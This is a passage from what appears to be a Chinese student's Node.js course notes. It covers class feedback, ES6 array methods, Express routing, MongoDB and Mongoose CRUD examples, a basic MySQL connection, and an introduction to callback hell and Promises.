还会自动生成一个文件：package-lock.json</li><li>npm5以后的版本安装包不需要加–save参数就能保存一来信息</li><li>当安装包时，会自动创建或者更新package.json</li><li>package-lock.json保存了node_modules中所有包的依赖树(版本、下载信息)</li><li>这样npm install速度增加</li><li>lock是锁定版本的</li></ul></li><li><p>早上听的还可以，下午感觉一头蒙，还好老师讲了晚上自己做案例的具体步骤，不然感觉无从下手，还是反馈多一点好，还可以回顾回顾，不然感觉老师一天讲的知识太多了，消化不了，嘤嘤嘤~~~</p></li><li><p>其实拖堂的效率也不高啊。。可能是我天资愚笨</p><ul><li>对自己有信息</li><li>撸起袖子加油干、一张蓝图绘到底</li></ul></li><li><p>老师你好，每节课的事件有点长，上课时间长注意力就容易模糊。听课效率确实有问题，有时候同桌都快憋不住了，为了不丢下知识点，依旧在憋着，好担心…</p></li><li><p>为什么模板引擎在app.js中引入之后在router.js中不引入可以直接使用，而express还需要在router.js中再引入一次 app.js中路由器挂载不是很懂 router.js中为什么要创建一个路由器容器，不知道作用是干什么的 es6中的find方法不是很懂</p><ul><li>中间件</li><li>EcmaScript 6 的 find 方法和findindexES6为Array增加了find()，findIndex函数。find()函数用来查找第一个符合条件的目标元素，找到就返回该元素，找不到返回undefined。findIndex()函数也是查找第一个符合条件的目标元素，找到就返回元素的位置，找不到就返回-1。他们的都是一个查找回调函数。<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>].find(<span class="function">(<span class="params">value, index, arr</span>) =&gt;</span> &#123;</span><br><span class="line">  </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>查找函数有三个参数。value：每一次迭代查找的数组元素。index：每一次迭代查找的数组元素索引。arr：被查找的数组<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>]</span><br><span class="line"><span class="keyword">var</span> ret1 = arr1.find(<span class="function">(<span class="params">value, index, arr</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> value &gt; <span class="number">4</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ret2 = arr1.find(<span class="function">(<span class="params">value, index, arr</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> value &gt; <span class="number">14</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;%s&#x27;</span>, ret1)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;%s&#x27;</span>, ret2)</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="literal">undefined</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ret3 = arr1.findIndex(<span class="function">(<span class="params">value, index, arr</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> value &gt; <span class="number">4</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ret4 = arr1.findIndex(<span class="function">(<span class="params">value, index, arr</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> value &gt; <span class="number">14</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;%s&#x27;</span>, ret3)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;%s&#x27;</span>, ret4)</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line"><span class="number">4</span></span><br><span class="line">-<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul></li><li><p>老师，你后来讲的回调函数那里，关于增删改查案例一个已经够呛了，你竟然在最后都讲完了； 虽然增删改查文件的操作在php之前讲过，但是真的忘了，而且php学的也不好； 还有：对于php是世界上最好的语言，我持怀疑态度，觉得它是世界上最难理解的语言； 诶！苦恼！又来了一个node，知道后边的boss都很难应付，比如什么angular、react和vue，现在其实也做好了心理准备！ 来者不拒吧！看来这一个月注定是一个煎熬的日子！</p><ul><li>PHP 是世界上最好的语言（贬义）</li><li>一切我抗</li></ul></li><li><p>在express框架中怎么判断访问页面不存在的情况？</p><ol><li>对于没有设定的路径，默认返回can not get xxx</li><li>如果想要定制404，需要通过中间件设置</li><li>只需要在自己的路由之后增加一个</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line"><span class="comment">//所有未处理的请求路径都会跑到这里</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul><h2 id="复习-3"><a href="#复习-3" class="headerlink" title="复习"></a>复习</h2><ul><li>文件路径中的 <code>/</code> 和模块标识中的 <code>/</code></li><li>Express 中配置使用 art-template 模板引擎</li><li>Express 中配置使用 body-parser</li><li>Express 中配置处理静态资源</li><li>CRUD 案例中单独提取路由模块</li></ul><h2 id="上午总结-4"><a href="#上午总结-4" class="headerlink" title="上午总结"></a>上午总结</h2><ul><li>回调函数<ul><li>异步编程</li><li>如果需要得到一个函数内部异步操作的结果，这是时候必须通过回调函数来获取</li><li>在调用的位置传递一个函数进来</li><li>在封装的函数内部调用传递进来的函数</li></ul></li><li>find、findIndex、forEach<ul><li>数组的遍历方法，都是对函数作为参数一种运用<ul><li>every</li></ul></li><li>some</li><li>includes</li><li>map</li><li>reduce</li></ul></li><li>package-lock.json 文件的作用<ul><li>下载速度快了</li><li>锁定版本</li></ul></li><li>JavaScript 模块化<ul><li>Node 中的 CommonJS</li><li>浏览器中的<ul><li>AMD require.js</li><li>CMD sea.js</li></ul></li><li>EcmaScript 官方在 EcmaScript 6 中增加了官方支持</li><li>EcmaScript 6</li><li>后面我们会学，编译工具</li></ul></li><li>MongoDB 数据库<ul><li>MongoDB 的数据存储结构<ul><li>数据库</li><li>集合（表）</li><li>文档（表记录）</li></ul></li></ul></li><li>MongoDB 官方有一个 mongodb 的包可以用来操作 MongoDB 数据库<ul><li>这个确实和强大，但是比较原始，麻烦，所以咱们不使用它</li></ul></li><li>mongoose<ul><li>真正在公司进行开发，使用的是 mongoose 这个第三方包</li><li>它是基于 MongoDB 官方的 mongodb 包进一步做了封装</li><li>可以提高开发效率</li><li>让你操作 MongoDB 数据库更方便</li></ul></li><li>掌握使用 mongoose 对数据集合进行基本的 CRUD</li><li>把之前的 crud 案例改为了 MongoDB 数据库版本</li><li>使用 Node 操作 mysql 数据库</li></ul><h3 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h3><h4 id="关系型数据库和非关系型数据库"><a href="#关系型数据库和非关系型数据库" class="headerlink" title="关系型数据库和非关系型数据库"></a>关系型数据库和非关系型数据库</h4><p>表就是关系，表和表之间存在关系</p><ul><li>所有的关系型数据库都需要通过sql语言编写</li><li>所有关系型数据库都需要设计表结构</li><li>而且表还支持约束<ul><li>唯一性</li><li>主键</li><li>默认值</li><li>非空</li></ul></li><li>非关系数据可非常灵活，key-value</li><li>MongoDB是长得最像关系型数据<ul><li>数据库-》数据库</li><li>数据表-》集合</li><li>表记录-》文档对象</li></ul></li><li>MongoDB不需要设计表结构</li><li>可以任意地往里面存东西，没有结构性的说法</li><li>MOngoDB可以有多个数据库</li><li>一个数据库可以有多个集合(表记录)</li></ul><h4 id="启动关闭数据库"><a href="#启动关闭数据库" class="headerlink" title="启动关闭数据库"></a>启动关闭数据库</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mongod</span><br><span class="line">#第一次执行手动建立/data/db文件夹</span><br></pre></td></tr></table></figure><p>修改默认存储目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongod --dbpath 数据存储路径(/data/db)</span><br></pre></td></tr></table></figure><p>停止</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctrl+c</span><br><span class="line">关闭开启服务的控制台</span><br></pre></td></tr></table></figure><h4 id="链接数据库"><a href="#链接数据库" class="headerlink" title="链接数据库"></a>链接数据库</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mongo</span><br><span class="line">#默认连接本机的MongoDB服务</span><br></pre></td></tr></table></figure><p>退出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#在连接状态输入exit</span><br></pre></td></tr></table></figure><h4 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h4><ul><li><p><code>show dbs</code></p><ul><li>查看显示所有的数据库</li></ul></li><li><p><code>use 数据库名称</code>  </p><ul><li>切换指定数据库</li></ul></li><li><p>插入数据</p><ul><li><p><code>db.students.insertOne(&#123;&quot;name&quot;:&quot;zx&quot;&#125;)</code></p><p><img src="https://s2.loli.net/2022/01/04/yp9fwtEXM6oNOH2.png" alt="image-20220104221123204"></p></li><li><p><code>show collections</code></p><p><img src="https://s2.loli.net/2022/01/04/P9WQ8n5CTSD1HbZ.png" alt="image-20220104221242127"></p></li><li><p><code>db.students.find()</code></p><p><img src="https://s2.loli.net/2022/01/04/PVeZRcWwO6otxu1.png" alt="image-20220104221103349"></p></li></ul></li></ul><h4 id="node中如何操纵MongoDB数据"><a href="#node中如何操纵MongoDB数据" class="headerlink" title="node中如何操纵MongoDB数据"></a>node中如何操纵MongoDB数据</h4><p>使用官方的Mongodb npm上搜索mongodb</p><p><a href="https://github.com/mongodb/node-mongodb-native">https://github.com/mongodb/node-mongodb-native</a></p><h4 id="使用第三方mongoose来操作MongoDB数据库"><a href="#使用第三方mongoose来操作MongoDB数据库" class="headerlink" title="使用第三方mongoose来操作MongoDB数据库"></a>使用第三方mongoose来操作MongoDB数据库</h4><p>第三方包:<code>mongoose</code>基于Mongodb官方的mongodb包再一次做了封装</p><p>mongoosejs.com</p><p><em>请先安装 <a href="http://www.mongodb.org/downloads">MongoDB</a> 和 <a href="http://nodejs.org/">Node.js</a>。</em></p><p>下一步，<code>npm</code>安装Mongoose:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install mongoose</span><br></pre></td></tr></table></figure><p>假设我们都很喜欢喵星人，想在MongoDB里记录每只我们见过的喵星人。 首先我们要在项目中引入 mongoose ，然后连接我们本地的 <code>test</code> 数据库。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// getting-started.js</span></span><br><span class="line"><span class="keyword">var</span> mongoose = <span class="built_in">require</span>(<span class="string">&#x27;mongoose&#x27;</span>);</span><br><span class="line">mongoose.connect(<span class="string">&#x27;mongodb://localhost/test&#x27;</span>);</span><br></pre></td></tr></table></figure><p><code>connect()</code> 返回一个状态待定（pending）的连接， 接着我们加上成功提醒和失败警告。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> db = mongoose.connection;</span><br><span class="line">db.on(<span class="string">&#x27;error&#x27;</span>, <span class="built_in">console</span>.error.bind(<span class="built_in">console</span>, <span class="string">&#x27;connection error:&#x27;</span>));</span><br><span class="line">db.once(<span class="string">&#x27;open&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// we&#x27;re connected!</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>连接成功时，回调函数会被调用。简洁起见， 我们假设下面所有函数都运行在这个回调函数里。</p><p>Mongoose 里，一切都始于<a href="http://www.mongoosejs.net/docs/guide.html">Schema</a>。 现在我们来看一个例子：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> kittySchema = mongoose.Schema(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">String</span></span><br><span class="line">    password：&#123;</span><br><span class="line">    <span class="attr">type</span>:<span class="built_in">String</span>,</span><br><span class="line">    <span class="attr">required</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>很好，我们得到了一个带有 <code>String</code> 类型 <code>name</code> 属性的 schema 。 接着我们需要把这个 schema 编译成一个 <a href="http://www.mongoosejs.net/docs/models.html">Model</a>：</p><p>传一个大写字母的字符串表示表的名称，mongoose会自动将大写名词的字符串生成<strong>小写复数</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Kitten = mongoose.model(<span class="string">&#x27;Kitten&#x27;</span>, kittySchema);</span><br></pre></td></tr></table></figure><p>model 是我们构造 document 的 Class。 在例子中，每个 document 都是一只喵，它的属性和行为都会被声明在 schema。 现在我们来“创造”一只猫：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> felyne = <span class="keyword">new</span> Kitten(&#123; <span class="attr">name</span>: <span class="string">&#x27;Felyne&#x27;</span> &#125;);</span><br><span class="line"><span class="built_in">console</span>.log(felyne.name); <span class="comment">// &#x27;Felyne&#x27;</span></span><br></pre></td></tr></table></figure><p>不会喵怎么算喵星人，现在给喵星人 document 加个 “speak” 方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 译者注：注意了， method 是给 document 用的</span></span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> methods must be added to the schema before compiling it with mongoose.model()</span></span><br><span class="line">kittySchema.methods.speak = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> greeting = <span class="built_in">this</span>.name</span><br><span class="line">    ? <span class="string">&quot;Meow name is &quot;</span> + <span class="built_in">this</span>.name</span><br><span class="line">    : <span class="string">&quot;I don&#x27;t have a name&quot;</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(greeting);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Kitten = mongoose.model(<span class="string">&#x27;Kitten&#x27;</span>, kittySchema);</span><br></pre></td></tr></table></figure><p>加在 schema <code>methods</code> 属性的函数会编译到 <code>Model</code> 的 prototype， 也会暴露到每个 document 实例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fluffy = <span class="keyword">new</span> Kitten(&#123; <span class="attr">name</span>: <span class="string">&#x27;fluffy&#x27;</span> &#125;);</span><br><span class="line">fluffy.speak(); <span class="comment">// &quot;Meow name is fluffy&quot;</span></span><br></pre></td></tr></table></figure><p>赞！是一只会说话的瞄星人！emmmmm虽然我们还没吧它存到数据库里。 每个 document 会在调用他的 <a href="http://www.mongoosejs.net/docs/api.html#model_Model-save">save</a> 方法后保存到数据库。 注意回调函数的第一个参数永远是 error 。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fluffy.save(<span class="function"><span class="keyword">function</span> (<span class="params">err, fluffy</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (err) <span class="keyword">return</span> <span class="built_in">console</span>.error(err);</span><br><span class="line">  fluffy.speak();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>后来我们收集了好多喵，就可以通过以下方法获取喵星人 <a href="http://www.mongoosejs.net/docs/models.html">model</a> 里的所有数据：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Kitten.find(<span class="function"><span class="keyword">function</span> (<span class="params">err, kittens</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (err) <span class="keyword">return</span> <span class="built_in">console</span>.error(err);</span><br><span class="line">  <span class="built_in">console</span>.log(kittens);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>如果我们想获取特定的数据， 可以了解一下 <a href="http://www.mongoosejs.net/docs/queries.html">query</a>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这么写可以获取所有 name 为 &quot;Fluff&quot; 开头的数据</span></span><br><span class="line">Kitten.find(&#123; <span class="attr">name</span>: <span class="regexp">/^fluff/</span> &#125;, callback);</span><br></pre></td></tr></table></figure><p>查询所有：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Kitten.find(<span class="function"><span class="keyword">function</span> (<span class="params">err, kittens</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">console</span>.error(err);</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(kittens);      </span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>按条件查询</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Kitten.find(&#123;<span class="attr">name</span>:fluff&#125;,<span class="function"><span class="keyword">function</span> (<span class="params">err, kittens</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">console</span>.error(err);</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(kittens);      </span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>删除</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Kitten.remove(&#123;<span class="attr">name</span>:fluff&#125;,<span class="function"><span class="keyword">function</span> (<span class="params">err, kittens</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">console</span>.error(err);</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(kittens);      </span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">现在推荐使用deleteOne和deleteMany</span><br></pre></td></tr></table></figure><p>增加数据需要先new再save</p><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>1.安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> npm install mysql</span></span><br></pre></td></tr></table></figure><p>2.使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mysql      = <span class="built_in">require</span>(<span class="string">&#x27;mysql&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> connection = mysql.createConnection(&#123;</span><br><span class="line">  <span class="attr">host</span>     : <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">  <span class="attr">user</span>     : <span class="string">&#x27;me&#x27;</span>,</span><br><span class="line">  <span class="attr">password</span> : <span class="string">&#x27;secret&#x27;</span>,</span><br><span class="line">  <span class="attr">database</span> : <span class="string">&#x27;my_db&#x27;</span></span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">connection.connect();</span><br><span class="line"> </span><br><span class="line">connection.query(<span class="string">&#x27;SELECT 1 + 1 AS solution&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">error, results, fields</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (error) <span class="keyword">throw</span> error;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;The solution is: &#x27;</span>, results[<span class="number">0</span>].solution);</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">connection.end();</span><br></pre></td></tr></table></figure><h2 id="下午总结-3"><a href="#下午总结-3" class="headerlink" title="下午总结"></a>下午总结</h2><h3 id="回调地狱callbackHell"><a href="#回调地狱callbackHell" class="headerlink" title="回调地狱callbackHell"></a>回调地狱callbackHell</h3><p>JavaScript 由于某种原因是被设计为单线程的，同时由于 JavaScript 在设计之初是用于浏览器的 GUI 编程，这也就需要线程不能进行阻塞</p><p>所以在后续的发展过程中基本都采用异步非阻塞的编程模式</p><p>简单来说，异步编程就是在执行一个指令之后不是马上得到结果，而是继续执行后面的指令，等到特定的事件触发后，才得到结果</p><p>也正是因为这样，我们常常会说: JavaScript 是由事件驱动的</p><p>我用Node来解释一下，回调地狱原理非常简单：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 读取文件 */</span></span><br><span class="line">fs.readFile(<span class="string">&#x27;a.txt&#x27;</span>,<span class="string">&#x27;utf8&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">error,data</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(error)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">console</span>.log(<span class="string">&#x27;读取数据失败！&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">fs.readFile(<span class="string">&#x27;b.txt&#x27;</span>,<span class="string">&#x27;utf8&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">error,data</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(error)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">console</span>.log(<span class="string">&#x27;读取数据失败！&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(‘b’);</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">fs.readFile(<span class="string">&#x27;c.txt&#x27;</span>,<span class="string">&#x27;utf8&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">error,data</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(error)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">console</span>.log(<span class="string">&#x27;读取数据失败！&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面的代码是读取3个不同的文件，读取完成分别打印a、b、c</p><p>那么上面代码的打印结果有顺序吗？是 a b c 吗？</p><p>上面的代码是异步执行的，没有人敢保证打印的顺序肯定是 a b c，这就是 <strong>异步编程</strong></p><p><strong>现在我们有个需求，a文件读完了再读b，b读完了再读c：</strong></p><p>我们可以这样写：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">fs.readFile(<span class="string">&#x27;a.txt&#x27;</span>,<span class="string">&#x27;utf8&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">error,data</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(error)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">console</span>.log(<span class="string">&#x27;读取数据失败！&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">  fs.readFile(<span class="string">&#x27;b.txt&#x27;</span>,<span class="string">&#x27;utf8&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">error,data</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(error)&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">console</span>.log(<span class="string">&#x27;读取数据失败！&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    fs.readFile(<span class="string">&#x27;c.txt&#x27;</span>,<span class="string">&#x27;utf8&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">error,data</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(error)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">console</span>.log(<span class="string">&#x27;读取数据失败！&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这样就保证了 a 读取完在读 b，b读取完在读 c 了</p><p>上面这种代码的书写方式其实就是 <strong>回调地狱</strong>，一层套一层，维护起来及其困难，如果有100个文件怎么办？</p><p>下面这张图是个经典的 <strong>Callback hell（回调地狱）</strong></p><p><img src="https://s2.loli.net/2022/01/07/bnBeAEy2KF81H3i.jpg" alt="img"></p><p>使用<a href="https://www.yulei1989.com/promise/"> Promise</a> 解决回调地狱问题</p><p>ECMAscript 6 原生提供了 Promise 对象。</p><p>Promise 对象代表了未来将要发生的事件，用来传递异步操作的消息。</p><h3 id="Promise对象特点"><a href="#Promise对象特点" class="headerlink" title="Promise对象特点"></a>Promise对象特点</h3><p>1、对象的状态不受外界影响。Promise 对象代表一个异步操作，有三种状态：</p><ul><li>pending: 初始状态，不是成功或失败状态。</li><li>fulfilled: 意味着操作成功完成。</li><li>rejected: 意味着操作失败。</li></ul><p>只有异步操作的结果，可以决定当前是哪一种状态，任何其他操作都无法改变这个状态。这也是 Promise 这个名字的由来，它的英语意思就是「承诺」，表示其他手段无法改变。</p><p>2、一旦状态改变，就不会再变，任何时候都可以得到这个结果。Promise 对象的状态改变，只有两种可能：从 Pending 变为 Resolved 和从 Pending 变为 Rejected。只要这两种情况发生，状态就凝固了，不会再变了，会一直保持这个结果。就算改变已经发生了，你再对 Promise 